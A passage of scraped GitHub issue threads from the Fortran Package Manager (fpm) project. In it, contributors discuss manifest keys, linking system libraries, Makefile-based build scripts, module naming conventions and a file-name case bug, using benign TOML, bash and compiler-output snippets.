                    "text": "If you create a new package with Cargo, say cargo new y, then you get the following Cargo.toml:\n[package]\nname = \"y\"\nversion = \"0.1.0\"\nauthors = [\"Ond\u0159ej \u010cert\u00edk <ondrej@certik.us>\"]\nedition = \"2018\"\n\n# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html\n\n[dependencies]\n\nSo the name is simply the name of the package. Even if it is just a simple executable. So I think the name should stay, it's the name of the project."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-14 16:36:06+00:00",
                    "text": "name is used as the default for many things, so you do need it. Otherwise, you'd need to be explicit about everything and likely repeat yourself, which we're trying to avoid for common use cases."
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2020-07-14 17:05:03+00:00",
                    "text": "If that is the case, shouldn't\n[[executable]]\nname =\n\nbe set by default to name? If you don't set the executable name, you get a similar error.\nEncountering this project for the first time, it wasn't really obvious what the parameters in the fpm.toml file mean. In addition to this, there is also\n[library]\nsource-dir\n\nwhich is the directory for files used to compile .mod and .a files. However\n[[executabe]]\nsource-dir\n\nCorresponds only to the name of the directory in build/gfortran_debug  where you find the compiled executable."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-14 18:22:59+00:00",
                    "text": "Yeah, we haven't worked through all of the possible combinations of fpm.toml inputs and under what combinations defaults should work. For example\n[[executable]]\nsource-dir = \"app1\"\nshould probably work with the \"defaults\" for name and main, but\n[[executable]]\nsource-dir = \"app1\"\n\n[[executable]]\nsource-dir = \"app2\"\nwould need to complain about conflicting names for the executables.\nThe documentation almost certainly needs work and clarification."
                },
                {
                    "user": "LKedward",
                    "date": "2021-03-31 18:53:39+00:00",
                    "text": "There is now a manifest reference detailing the contents for fpm.toml and, as explained above, the name key is preferred as a top level entry to refer to the overall project. I will now close this issue."
                }
            ]
        },
        {
            "number": 119,
            "user": "MarkWieczorek",
            "date": "2020-07-14 12:16:41+00:00",
            "title": "Link to precompiled system-wide archives",
            "text": "fpm is great for including external fortran projects as dependencies (typically downloaded at github).\nHowever, it often arises that a fortran project needs to link to an already compiled system-wide archive, such as lapack or fftw. At present, to the best of my knowledge, there is no simple way to link to such files in fpm. It is possible that this might be possible using a Makefile, but that would be non-optimal.\nIdeally, the libraries to link to would be placed in the fpm.toml file,  something like this:\nlink = 'fftw, lapack'",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-14 16:13:16+00:00",
                    "text": "This is certainly on our radar. We just haven't gotten to it yet."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-30 22:11:16+00:00",
                    "text": "Since we flagged this for our first beta release, we should agree on a syntax for it.\nI would suggest to include the external libraries in the build section:\n[build]\nlink = [\"fftw\", \"lapack\"]\nWhich would translate to\ngfortran ... -lfftw -llapack\n\nin the link line.\nTo group libraries in the link line nested arrays could be used."
                }
            ]
        },
        {
            "number": 118,
            "user": "MarkWieczorek",
            "date": "2020-07-10 21:14:34+00:00",
            "title": "Compile archive using pre-existing Makefile",
            "text": "I have a somewhat complicated archive that is compiled with a pre-existing Makefile, and I would like to make this more accessible to those who might want to use it as a fpm dependency.\nBased on the documentation, I thought that I would just need to specify the name of the Makefile in the fpm.toml file, but this obviously didn't work.\nI think that it would be very useful for fpm to have have the option of simply executing a pre-existing makefile, and then placing the compiled .mod and .a files wherever it is that they are needed. Ideally, this would be specified in the fpm.toml file something like this:\n[library]\nmakefile = \"make all F95=$(FC) DIR=$(BUILD_DIR)\"\n\nAlternatively, given that the .mod and .a files are initially found in the src directory, instead of having the makefile manually move them to $(BUILD_DIR), this could be done by fpm itself after the makefile successfully terminates.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-11 00:33:19+00:00",
                    "text": "We certainly want to try and make migrating existing projects to fpm as easy as possible. The questions that need to be answered to solve this problem are:\n\nHow does fpm figure out how to call the makefile? You're example shows something that might be workable\nHow does fpm figure out where the makefile put the stuff it needs to copy? This one's a bit harder\n\nOn the other hand, you could write a script that manually runs the makefile and does the appropriate copy commands. It's a tad less portable, but a pretty straightforward workaround."
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2020-07-11 09:40:46+00:00",
                    "text": "On the other hand, you could write a script that manually runs the makefile and does the appropriate copy commands.\n\nIs it possible for fpm to run a script now (without compiling files) ? That would probably work for me."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-13 14:45:56+00:00",
                    "text": "@MarkWieczorek, yes. Check out the details here. Let us know if anything is unclear or you get stuck."
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2020-07-13 20:52:32+00:00",
                    "text": "I am starting to make some progress.\nFirst, it turns out that if you have your own Makefile from a pre-existing project\n[library]\nsource-dir=\"src\"\nbuild-script = \"make all\"\n\nand\n[library]\nsource-dir=\"src\"\nbuild-script = \"Makefile\"\n\ndo not do the same thing. The first example actually does what I want (i.e., just do a make all in shell) but the second seems to try compile my source files using fpm.\nSecond, if you exclude the src-dir line, the following doesn't work as expected:\n[library]\nbuild-script = \"make all\"\n\nThis suprises me, because fpm doesn't need to know where my source files are, given that everything is to be compiled by my pre-existing makefile.\nI think that part of the solution will be to refactor the documentation, and describe what is actually happening with the above commands. It would be very useful to have a section in the documentation describing how to port a pre-existing project to fpm."
                },
                {
                    "user": "certik",
                    "date": "2020-07-13 20:54:57+00:00",
                    "text": "We should have tests for all of the above, then it will at least be clear what is supposed to work."
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2020-07-13 21:25:29+00:00",
                    "text": "One final thing:\nEverything works when using\nname = \"project\"\n[library]\nsource-dir=\"src\"\nbuild-script=make all F95=$FC\n\nHowever,  fpm build ends with the error/warning\nmake: *** No rule to make target `/path/build/gfortran_debug/project/libproject.a'.  Stop.\n\nThis is because (as stated in the docs) \"Additionally, script will be called with the name of the archive (*.a file) that should be produced as the command line argument.\"\nIs there a way to disable this behavior?"
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2020-07-14 11:52:41+00:00",
                    "text": "I've encountered one final problem, which unfortunately is the most important for me.\nFirst, I can successfully compile my project locally using a pre-existing makefile, as described above. The makefile moves all the .mod and .a files to BUILD_DIR, which is located in the main directory at\ngfortran_debub/project/\n\nHowever, if I try to use my project as a dependency (downloaded from github) in another project, the .mod and .a files are located at\nbuild/dependencies/project/build/gfortran_debug/project/\n\nand the following directory is empty:\nbuild/gfortran_debug/prioject/\n\nWhen building the code that makes use of the dependencies, fpm can no longer find where the dependency .a and .mod files are located.\nDoes anyone have any ideas on how to solve this problem? Obviously the files from build/dependencies/project/build/gfortran_debug/project/ need to be copied to build/gfortran_debug/prioject/, but I don't see how to do this."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-14 16:22:17+00:00",
                    "text": "In your case, I'd recommend using a wrapper script to make doing things properly a bit easier. Something like\n#!/bin/bash\n\nexpected_archive=$1\n\nmake all F95=$FC\ncp where/your/*.mod $BUILD_DIR\ncp where/your/archive.a $expected_archive\nbecause, as you've noticed, the build directory will be different when included as a dependency. If you can, you should try and make use of the FFLAGS environment variable as well, so in the future, projects using yours can try out different compiler flags."
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2020-07-14 20:09:30+00:00",
                    "text": "That might work, but what would I use as the argument to the script ($1) ?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-14 22:01:13+00:00",
                    "text": "fpm calls that script with the appropriate argument. So assuming your script is called build_script.sh, your fpm.toml would look like\n...\n[library]\nsource-dir = \"src\" # presumably\nbuild_script = \"build_script.sh\"\n...\nand fpm will call your script (effectively) like\nFC=gfortran FFLAGS=\"-some -flags ...\" BUILD_DIR=\"wherever/fpm/decides\" INCLUDE_DIRS=\"build/thing1 build/package2 ...\" build_script.sh some/where/libpackage.a"
                },
                {
                    "user": "certik",
                    "date": "2020-07-14 22:25:11+00:00",
                    "text": "@everythingfunctional why not pass everything as environment variables?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-14 23:05:22+00:00",
                    "text": "I'm not sure I have a thoroughly compelling answer, but my thinking is along the lines of the following:\n\nWe should conform to common practices in existing build systems\nCommon build commands (or at least the ones I'm used to) are of the form build_script what_I_would_like_built\nA common practice for overriding build parameters is via environment variables\n\nI'd agree it's not the most elegant and consistent design, but if our goal is to make migrating to fpm easier, conforming to existing practices is probably the way to go."
                },
                {
                    "user": "certik",
                    "date": "2020-07-14 23:23:38+00:00",
                    "text": "I would suggest to follow Cargo's approach, and not invent our own conventions.\n\u2026\nOn Tue, Jul 14, 2020, at 5:05 PM, Brad Richardson wrote:\n\n\n I'm not sure I have a thoroughly compelling answer, but my thinking is\n along the lines of the following:\n\n  * We should conform to common practices in existing build systems\n  * Common build commands (or at least the ones I'm used to) are of the\n form `build_script what_I_would_like_built`\n  * A common practice for overriding build parameters is via environment\n variables\n I'd agree it's not the most elegant and consistent design, but if our\n goal is to make migrating to fpm easier, conforming to existing\n practices is probably the way to go.\n\n \u2014\n You are receiving this because you commented.\n Reply to this email directly, view it on GitHub\n <#118 (comment)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AAAFAWEBAUPZFHBQJ6YSGPTR3TQD7ANCNFSM4OW6ADFA>."
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2020-07-15 07:47:26+00:00",
                    "text": "some/where/libpackage.a\n\nAnd what about the .mod files?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-15 18:34:25+00:00",
                    "text": "The mod files need to go in the same place."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-15 18:41:02+00:00",
                    "text": "I would suggest to follow Cargo's approach, and not invent our own conventions.\n\u2026\nOn Tue, Jul 14, 2020, at 5:05 PM, Brad Richardson wrote: I'm not sure I have a thoroughly compelling answer, but my thinking is along the lines of the following: * We should conform to common practices in existing build systems * Common build commands (or at least the ones I'm used to) are of the form build_script what_I_would_like_built * A common practice for overriding build parameters is via environment variables I'd agree it's not the most elegant and consistent design, but if our goal is to make migrating to fpm easier, conforming to existing practices is probably the way to go. \u2014 You are receiving this because you commented. Reply to this email directly, view it on GitHub <#118 (comment)>, or unsubscribe https://github.com/notifications/unsubscribe-auth/AAAFAWEBAUPZFHBQJ6YSGPTR3TQD7ANCNFSM4OW6ADFA.\n\nI think Cargo's approach is really good, and we should strive for it. In the mean time, we don't yet support using Fortran as a build script, and their approach doesn't support any other custom (or existing) build scripts, like we would (maybe) like to support."
                },
                {
                    "user": "certik",
                    "date": "2020-07-15 20:03:47+00:00",
                    "text": "Cargo requires to write Rust code for the script. We should allow other scripts such as Bash or Makefile, as we discussed. But they should be treated exactly the same as the (future) Fortran script (if we decide to allow that, or just require Bash or Makefile).\nThe API is described here:\nhttps://doc.rust-lang.org/cargo/reference/build-scripts.html\nThe script is run as is (with no arguments) and everything is passed using environment variables:\nhttps://doc.rust-lang.org/cargo/reference/build-scripts.html#inputs-to-the-build-script\nAnd the outputs are communicated by printing to stdout using the \"cargo:...\" encoding:\nhttps://doc.rust-lang.org/cargo/reference/build-scripts.html#outputs-of-the-build-script\nCan we do the same for fpm?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-15 21:06:55+00:00",
                    "text": "I think we should move towards Cargo's API design. Then the communication mechanism can be the same for any build script; inputs as environment variables, outputs as prefixed lines on stdout.\nThere is a subtle distinction between Bash, Makefile, and Fortran build scripts though that they aren't treated exactly the same. Fortran must be compiled first, potentially with some dependencies if we're following Cargo's design. Bash scripts are executed directly, and Makefiles must be executed with make.\nI also don't know that this design will make it any easier to transition existing projects to fpm. There is virtually no chance that an existing build system will \"just work\" with this design, but that chance was probably pretty small with my design anyway."
                },
                {
                    "user": "certik",
                    "date": "2020-07-15 21:16:43+00:00",
                    "text": "Perfect, thanks. Yes, I agree it won't make it easier for other projects to port, but by using the same design as Rust, at least they don't have to update their build scripts once they port (currently they will have to update the makefile / bash script after we change the API).\nUsing Fortran as a script sound weird at first, but make sense from a multiplatform perspective, as it would run natively on Windows and other platforms, while Bash typically does not run natively, but requires a linux subsystem on Windows. I think that's why Cargo chose Rust as the script."
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2020-07-15 21:39:52+00:00",
                    "text": "I think that there is a very simple solution for projects that compile with pre-existing makefiles: We just need to define two environment variables.\n\nBUILD_DIR is already defined, and tells where to put the .mod and .a files within the original project. This would either be in the directory build/gfortran_debug/project if you were simply building the project by itself, or in build/dependencies/gfortran_debug/project if you were installing it as a dependency.\nINSTALL_DIR, which is where the contents of BUILD_DIR get copied when the project is installed as a dependency. This corresponds to BUILD_DIR/../../gfortran_debug/project.\n\nIn practice, the makefile would compile all the .mod and .a files in BUILD_DIR, and only if INSTALL_DIR is defined would they then get copied to INSTALL_DIR."
                },
                {
                    "user": "certik",
                    "date": "2020-07-15 23:23:58+00:00",
                    "text": "Something like that. Here is the list of environment variables that Cargo defines:\nhttps://doc.rust-lang.org/cargo/reference/environment-variables.html#environment-variables-cargo-sets-for-build-scripts\nnote that most are prefixed with CARGO_, but some are not. I suspect the ones that are not are due to historical reasons. I very strongly suggest we prefix all our environment variables by FPM_, so it would be FPM_BUILD_DIR and FPM_INSTALL_DIR. The reason is that it is very easy to make complex 3rd party build systems fail if you define an environment variable with a common name like BUILD_DIR or INSTALL_DIR, because the customized 3rd party build system can easily do something different if this variable is defined. By prefixing all variables, we ensure that our environment variables do not clash with user defined variables. It's a good habit to do that, not to pollute the environment namespace."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-15 23:55:50+00:00",
                    "text": "A quick note, BUILD_DIR is always build/<compiler>_<debug_or_release>/project, whether it's building your project standalone or as a dependency. So when building your project as a dependency, the BUILD_DIR is not within your project's directory. Thus, no need for the INSTALL_DIR variable."
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2020-07-16 08:48:18+00:00",
                    "text": "Thanks for all the help: I turns out that I was misinterpreting how BUILD_DIR was being set for stand-alone projects and dependencies. (I also made a dumb choice to hardcode the variable build/gfortran_debug/myproject in the makefile for the standalone project). Using\nbuild-script = \"make all F95=$FC LIBPATH=$BUILD_DIR MODPATH=$BUILD_DIR\"\n\nnow works for both cases :) The only thing I need to do to make this work is to be able to link to system-wide libraries.\nOne final question: how do I change debug to release ?"
                },
                {
                    "user": "jvdp1",
                    "date": "2020-07-29 20:17:34+00:00",
                    "text": "Could the Makefile of stdlib be already used to compile stdlib with fpm?"
                },
                {
                    "user": "zoziha",
                    "date": "2021-05-31 11:11:00+00:00",
                    "text": "We certainly want to try and make migrating existing projects to fpm as easy as possible. The questions that need to be answered to solve this problem are:\n\nHow does fpm figure out how to call the makefile? You're example shows something that might be workable\nHow does fpm figure out where the makefile put the stuff it needs to copy? This one's a bit harder\n\nOn the other hand, you could write a script that manually runs the makefile and does the appropriate copy commands. It's a tad less portable, but a pretty straightforward workaround.\n\nI have a good idea, it should be able to use different make tools, such as make, cmake.\n\nI think the make tool generally only displays simple commands, such as make build and cmake build. Obviously, these are commands and we need to deal with them. They are more like coherent tasks besides static commands.\nUse the binary files generated by the make tool, such as link libraries and intermediate .obj files. Only the make tool and developers know where they are generated.\n\nBased on the above analysis, we can add items like [make] to fpm.toml:\n[package]\nname = \"fpm-make-test\"\n\n[make]\n[make.tasks.src]\ndescription = \"Generate src_dir objs.\"\ncommand = \"make\"\nargs = [\"-f\", \"makefile\", \"--directory=src\"]\nkind = \"objs\"     # shared/static/objs/binary\nobjs_dir = [\"./build/objs/src1/\", \n            \"./build/objs/src2/\",\n            ...\n]\n\n[make.tasks.others]\n...\nWe use fpm's absolute control over fpm.toml to control the commands of the make tool and the path of the generated binary file. fpm selects the behavior of fpm by extracting the path of the generated binary file.\nWe leave this [make] to the developer to consider. fpm just sends make commands and accepts task results.\nMy inspiration comes from:\n\nhttps://medium.com/@sagiegurari/automating-your-rust-workflows-with-cargo-make-part-1-of-5-introduction-and-basics-b19ced7e7057\nhttps://github.com/sagiegurari/cargo-make"
                }
            ]
        },
        {
            "number": 117,
            "user": "everythingfunctional",
            "date": "2020-07-08 18:25:48+00:00",
            "title": "Fix bug with case in program source file name.",
            "text": "Fix #116\nI guess up to now nobody had tried using uppercase in the name of their program source file. This fixes it.",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-07-11 21:47:28+00:00",
                    "text": "Nice timing. This was vexing me and I had just found the work-around and was going to report the bug.  Guess it is time to update my copy of fpm(1). That raises the question of whether there should be a line to put in the input files indicating what version of fpm(1) was tested with (which might produce a warning) and what version is at (at least) required? \\\nI would change the pathname back to containing uppercase letters but I am  afraid it would confuse anyone attempting to use the repository with an older version of fpm(1), for example.\nI was working on setting up the following for use with fpm(1) when I hit the problem:\n[dependencies]\n M_process      = { git = \"https://github.com/urbanjost/M_process.git\" }\n\nC SUPPORT?\nI see others have mentioned at least supporting C wrappers for use with the intrinsic module ISO_C_BINDING; but unless that is imminent does anyone have an example using a custom build script that does that? I have a bunch of stuff (M_system, M_draw, M_ncurses, ... that has C wrappers or bindings that I wanted to try with fpm(1) but that is a show stopper; whereas STACK has good multi-language support, etc..\nREVIEW?\nI have a bunch of stuff I was trying with fpm(1) so if anyone has time to comment on how I have used (abused?) it so far, M_process and M_time are about done as far as what I was planning on.\nPRETTY PICTURE WANTED?\nAny kind of an image to place on pages that support fpm(1)? A glowing box with light coming out of it with a big \"F\" above the box?  Anyone feeling artistic?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-13 16:05:55+00:00",
                    "text": "@urbanjost , I have an example wrapping a C library here.\nIf I can find some free time I'll try and give your project a look."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-13 18:45:36+00:00",
                    "text": "@certik can you please review this or approve without review? This fix allows some users to build their packages."
                },
                {
                    "user": "certik",
                    "date": "2020-07-13 20:06:53+00:00",
                    "text": "This looks good, the fix is simple and tests pass."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-07-16 01:39:47+00:00",
                    "text": "The C wrapper and Makefile and fpm example project file are great. It was not clear from the documentation I had found so far how to do that. I wil see how far I get in the next few days.  Not knowing how to do this was preventing me from going much further with my fpm experiments."
                }
            ]
        },
        {
            "number": 116,
            "user": "lauvergn",
            "date": "2020-07-08 12:03:45+00:00",
            "title": "fortran main name file",
            "text": "I found an issue related to the name of the main fortran file.\nWhen main.f90 is in the app directory, the executable is created nicely. Part of the fpm.toml file is:\n\n[[executable]]\nname=\"TEST_dnS.x\"\nsource-dir=\"app\"\nmain=\"main.f90\"\n\nHowever, when, I'm using another name (TEST_dnS.f90)\n\n[[executable]]\nname=\"TEST_dnS.x\"\nsource-dir=\"app\"\nmain=\"TEST_dnS.f90\"\n\nI've got some errors:\n\nfpm: Error when running Shake build system:\nat want, called at src/Build.hs:114:11 in fpm-0.1.0.0-ExRRX9W2aflLvTBBChPpxh:Build\n\nDepends on: build/gfortran_debug/app/TEST_dnS.x\nat need, called at src/Build.hs:120:13 in fpm-0.1.0.0-ExRRX9W2aflLvTBBChPpxh:Build\nDepends on: build/gfortran_debug/app/test_dns.o\nat &%>, called at src/Build.hs:137:11 in fpm-0.1.0.0-ExRRX9W2aflLvTBBChPpxh:Build\nDepends on: build/gfortran_debug/app/test_dns.o build/gfortran_debug/app/test_dns.mod\nat undefined, called at src/Build.hs:142:25 in fpm-0.1.0.0-ExRRX9W2aflLvTBBChPpxh:Build\nat error, called at libraries/base/GHC/Err.hs:78:14 in base:GHC.Err\nRaised the exception:\nPrelude.undefined",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-08 15:16:36+00:00",
                    "text": "That looks to me like it's expecting a test_dns module. Perhaps there is a uppercase/lowercase mismatch in the file name? Maybe try deleting the build directory to start fresh?\nI can maybe try and dig deeper later today if none of those work."
                },
                {
                    "user": "lauvergn",
                    "date": "2020-07-08 15:24:22+00:00",
                    "text": "Perhaps there is a uppercase/lowercase mismatch in the file name?\n\nI thought about that too, but it is not that.\n\nMaybe try deleting the build directory to start fresh?\n\nI've tried that as well (several times!!)"
                },
                {
                    "user": "lauvergn",
                    "date": "2020-07-08 16:33:34+00:00",
                    "text": "I can maybe try and dig deeper later today if none of those work.\n\nThanks, you can get the full test here:\nhttps://github.com/lauvergn/test-fpm"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-08 18:18:53+00:00",
                    "text": "Figured out the problem. The build process for the executable isn't handling upper-case vs lower-case correctly for the name of the source file vs the name of the object file. I'll get a fix put together shortly."
                },
                {
                    "user": "lauvergn",
                    "date": "2020-07-08 18:21:15+00:00",
                    "text": "Figured out the problem. The build process for the executable isn't handling upper-case vs lower-case correctly for the name of the source file vs the name of the object file. I'll get a fix put together shortly.\n\nThanks"
                },
                {
                    "user": "lauvergn",
                    "date": "2020-07-09 12:58:04+00:00",
                    "text": "Thnanks"
                }
            ]
        },
        {
            "number": 115,
            "user": "lauvergn",
            "date": "2020-07-08 07:50:32+00:00",
            "title": "Moving a fpm package structure to another one",
            "text": "In a way, it is not an issue about the actual fpm tool, but something which might be annoying in the future.\nLet assume, you have package with one or several libraries, so the fpm tree is:\n\nsrc/math_constants/\nsrc/phys_constants/\n\nSo a fortran files is math_constants_xxx.f90 and its corresponding module name is math_constants_xxx.\nNow, if one wants to move this structure to a more complex one (or it is taken from another package):\n\nsrc/Util/math_constants/\nsrc/Util/phys_constants/\n\nThen it means, you have to change:\n\nall module names inside the library and also in the other part of the code (much more complex, although with some ide it is doable)\n\nI think fpm needs some tools to perform such features.\nalias gardhor",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-08 15:11:00+00:00",
                    "text": "Yes, we discussed this exact issue in the past and we all agree that fpm should be able to fix up your code when you move files around."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-08 15:13:28+00:00",
                    "text": "Yeah, I could definitely see that being a desired refactoring, and it certainly would be a chore to do manually.\nSolving this properly will involve a more complete Fortran parser than we've needed so far. This and other desired features are making it pretty clear that we're going to need one.\nSome thoughts on what the user interface might look like:\n\nfpm move <old-name> <new-name>\nfpm rename <old-name> <new-name>\nMaybe have a separate tool?"
                },
                {
                    "user": "certik",
                    "date": "2020-07-08 15:19:00+00:00",
                    "text": "Actually the API I was thinking of would be:\n\nfpm fix_module_names or something like that, and it would go into each file and ensure the module name corresponds to the path.\n\nBut I can see that fpm move would also be useful to fix all use statements.\nThese are all things that we should do in the Fortran version of fpm."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-08 15:32:49+00:00",
                    "text": "Just an idea. Could it be part of fpm build? Example:\n$ fpm build\n...\n...\nfpm error: I found inconsistent module name in src/a/b/util.f90. Do you want me to fix it? [y/n/a]\n\nSo an error would trigger a prompt from user, which could be overriden with a flag like fpm build --fix-all or similar.\nLike with many other software things, it's a design compromise between many small commands versus fewer more general commands. I don't know what's nicer for the average user."
                },
                {
                    "user": "lauvergn",
                    "date": "2020-07-08 15:44:12+00:00",
                    "text": "fpm fix_module_names or something like that, and it would go into each file and ensure the module name corresponds to the path.\n\n\nA tool like that will be great also to move (or to help moving) a none-fpm package to a fpm one."
                },
                {
                    "user": "certik",
                    "date": "2020-07-08 15:47:03+00:00",
                    "text": "@milancurcic and @lauvergn yes to both. For fpm build, perhaps with an option fpm build -i (as in interactive), since I think the build should not wait for user input by default, as it would stall on CIs."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-08 15:49:51+00:00",
                    "text": "Yep, I agree. Both of those would also be useful additions. To the extent possible fpm should provide meaningful error messages and help the user fix any problems related to the conventions/restrictions that it imposes."
                }
            ]
        },
        {
            "number": 114,
            "user": "smeskos",
            "date": "2020-07-07 13:05:05+00:00",
            "title": "module naming issue",
            "text": "I found out after a lot of trouble that I couldn't build my project because I had all the modules files in src/ in the form mod_name.f90, when I renamed all files to m_name.f90 and the modules to module m_name respectively, it recognized them all and built successfully.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-07-07 14:06:09+00:00",
                    "text": "Right, it's an important detail. :)\nI'm curious, did you read the Packaging Guide beforehand? If not, perhaps we need to link to it more prominently from the README. Currently it's at the bottom. If you did read it, was any part of the guide confusing?"
                },
                {
                    "user": "smeskos",
                    "date": "2020-07-07 15:11:10+00:00",
                    "text": "Yes, I read it. Let me rephrase, the problem was not with the same name, I already had my files and modules named the same. The problem is with the particular style: mod_name.f90 and module mod_name. It couldn't recognize modules starting with the prefix mod_."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-07 15:17:44+00:00",
                    "text": "Okay, I see. I don't think that should be the case. @everythingfunctional can you confirm this behavior? Is it expected?"
                },
                {
                    "user": "certik",
                    "date": "2020-07-07 15:34:49+00:00",
                    "text": "We discussed the naming convention in #39 a bit.\nI think the above seems to be a bug either way, but in general, we were thinking that we could simply name the modules by a name, and then fpm would enforce the directory structure in the name. So if you are calling your module as mod_name, and put it into src/a/b/mod_name.f90, then fpm would enforce that the module is called a_b_mod_name, but the filename is just mod_name.f90. That way we are essentially allowing to have namespaces."
                },
                {
                    "user": "certik",
                    "date": "2020-07-07 15:36:38+00:00",
                    "text": "The other issue related to this is that all modules should probably be prefixed by the name of the package, again, enforced by fpm. That way when you depend on it in other dependencies, the modules do not clash. So src/mymod.f90 would start with module mypackage_mymod."
                },
                {
                    "user": "certik",
                    "date": "2020-07-07 15:41:29+00:00",
                    "text": "CCing @everythingfunctional, it's important that we get this right soon.\nI think the way we could do it is to implement what I described above by default and fpm would give an error if the modules are not named correctly. But users could override this in fpm.toml, if they really do not want to use this convention, say with module_naming_convention = false or something like that.\nFor example, in stdlib we already are naming modules like stdlib_experimental_io. After we move stdlib to use fpm, we would have a directory structure: src/experimental/io.f90, and since the package is called stdlib and since io.f90 is in the experimental directory, the file would start with module stdlib_experimental_io (as it already does). After the module graduates to stable, we move it to src/io.f90 and it would start with module stdlib_io."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-07 15:50:48+00:00",
                    "text": "The other issue related to this is that all modules should probably be prefixed by the name of the package, again, enforced by fpm. That way when you depend on it in other dependencies, the modules do not clash. So src/mymod.f90 would start with module mypackage_mymod.\n\nI agree that we need some solution to prevent name clash with dependencies, but this solution doesn't look like a good one to me. Consider datetime-fortran, which has the package name \"datetime\", and one module that contains a derived type datetime. How do you suggest I name the module?\nThe way it's named currently (datetime_module), this would require that I rename the module source file to src/module.f90. It works but it's very awkward to me."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-07 16:52:55+00:00",
                    "text": "If  mod_name as the name of a module was not working but m_name was, that's a bug. I'm not sure what the problem is offhand.\nI think enforcing modules in a library be prefixed by the project name is probably overkill. If namespacing is needed, we have a way to do that. Just put everything in a folder with the name of the library. I'm not sure having that be the default is necessary."
                },
                {
                    "user": "smeskos",
                    "date": "2020-07-07 20:02:58+00:00",
                    "text": "I tried to replicate my issue with a smaller test case, and I couldn't, this time, fpm worked fine with modules with prefix mod_.  I also tried https://github.com/wavebitscientific/functional-fortran from  @milancurcic (since his modules are with mod_) and it also worked fine. I can only guess that I am missing something in my main project. I am going to look into it and will come back when I figure it out. Sorry for this false alarm. Regardless, your comments were very interesting and helpful. Thank you all!"
                },
                {
                    "user": "certik",
                    "date": "2020-07-07 20:28:42+00:00",
                    "text": "@smeskos I am glad it works!\n@everythingfunctional I don't know. We should discuss it. I feel module names without prefixes should be reserved for the main (user) application. Libraries should hide their modules behind a prefix. That is the common convention in C, which has the same problem (all functions being global). So if we agree that is a good convention, then we should enforce it (users can opt-out)."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-02-12 15:27:20+00:00",
                    "text": "The naming restrictions have been relaxed in both Fortran fpm in the current release. Therefore, I'm closing this issue as resolved. Feel free to reopen if this is not the case."
                }
            ]
        },
        {
            "number": 113,
            "user": "smeskos",
            "date": "2020-07-07 12:57:28+00:00",
            "title": "preprocessor directives",
            "text": "I am trying to build a simple logging library I wrote some time ago. In order to get file names and current line number I use a small preprocessor file: macros.h that only contains:\n#ifndef FL\n#define FL __FILE__\n#endif\n\n#ifndef LN\n#define LN __LINE__\n#endif\nand I include it at the beginning of the file I want to use it like #include \"macros.h\"\nI get this error when I am trying to build with fpm:\nExit code: 1\nStderr:\ntest/main.f90:1:2:\n\n    1 | #include \"marcos.h\"\n      |  1\nWarning: Illegal preprocessor directive\ntest/main.f90:8:20:\n\n    8 |     call log%info(FL, LN, 'Passed')\n      |                    1\nError: Symbol \u2018fl\u2019 at (1) has no IMPLICIT type\ncompilation terminated due to -fmax-errors=1.\nNote that this is with main.f90\nWhen I changed the name to main.F90and the fpm.toml file accordingly:\n[[test]]\nname=\"runTests\"\nsource-dir=\"test\"\nmain=\"main.F90\"\nThen I got this error:\nExit code: 1\nStderr:\ntest/main.F90:2:2:\n\n    2 | program test\n      |  1~~~~~~~~~\nFatal Error: marcos.h: No such file or directory\ncompilation terminated.\nAny suggestions of what I may be doing wrong?",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-07-07 14:08:37+00:00",
                    "text": "Is your include file macros.h or marcos.h? Currently your f90 file tries to include marcos.h but perhaps the file is called macros.h."
                },
                {
                    "user": "certik",
                    "date": "2020-07-07 14:30:27+00:00",
                    "text": "As discussed in #78, the .f90 files should also be run through the pre-processor, perhaps no by default (for speed reasons), but if you enable it in the fpm.toml."
                },
                {
                    "user": "smeskos",
                    "date": "2020-07-07 15:06:36+00:00",
                    "text": "@milancurcic You are correct that was a typo, but the problem persists after correcting it."
                },
                {
                    "user": "LKedward",
                    "date": "2020-07-07 15:17:42+00:00",
                    "text": "Hi @smeskos, is the macros.h file in the same folder as the .f90 files that include it?"
                },
                {
                    "user": "smeskos",
                    "date": "2020-07-07 15:32:22+00:00",
                    "text": "@LKedward right, that was the problem. I had this in src/ but I wanted to use it in test/. Thank you!!"
                },
                {
                    "user": "LKedward",
                    "date": "2020-07-07 16:27:33+00:00",
